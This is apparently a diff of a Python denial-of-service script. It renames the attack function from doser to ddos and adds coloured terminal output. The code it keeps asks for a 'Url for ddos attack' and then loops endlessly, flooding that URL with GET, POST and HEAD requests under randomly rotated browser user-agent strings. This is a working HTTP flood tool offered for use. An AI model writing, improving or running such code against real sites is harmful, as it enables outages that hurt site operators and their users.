@@ -6,8 +6,15 @@ import os
 import sys
 import requests
 
-def doser():
-	print("Terminate attack by clicking: CTRL + Z")
+R = '\033[31m'
+G = '\033[32m'
+C = '\033[36m'
+W = '\033[0m'
+
+def ddos():
+	os.system('python src/logo.py')
+	print('')
+	print(G + "Terminate attack by clicking: CTRL + Z")
 	users = [
 		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36",
@@ -1163,20 +1170,20 @@ def doser():
 		'User-Agent' : random.choice(users)
 	}
 
-	url = input("Url for ddos attack:")
+	url = input(G + "Url for ddos attack:")
 	while True:
 		requests.get(url, headers=headers)
-		print("Get " + url)
+		print(R + "Get " + url)
 		requests.post(url, headers=headers)
-		print("post " + url)
+		print(R + "post " + url)
 		requests.head(url, headers=headers)
-		print("head " + url)
+		print(R + "head " + url)
 		requests.get(url, headers=headers)
-		print("Get " + url)
+		print(R +"Get " + url)
 		requests.post(url, headers=headers)
-		print("post " + url)
+		print(R + "post " + url)
 		requests.head(url, headers=headers)
-		print("head " + url)
+		print(R + "head " + url)
 		headers = { 'User-Agent' : random.choice(users) }
 
-doser()
+ddos()
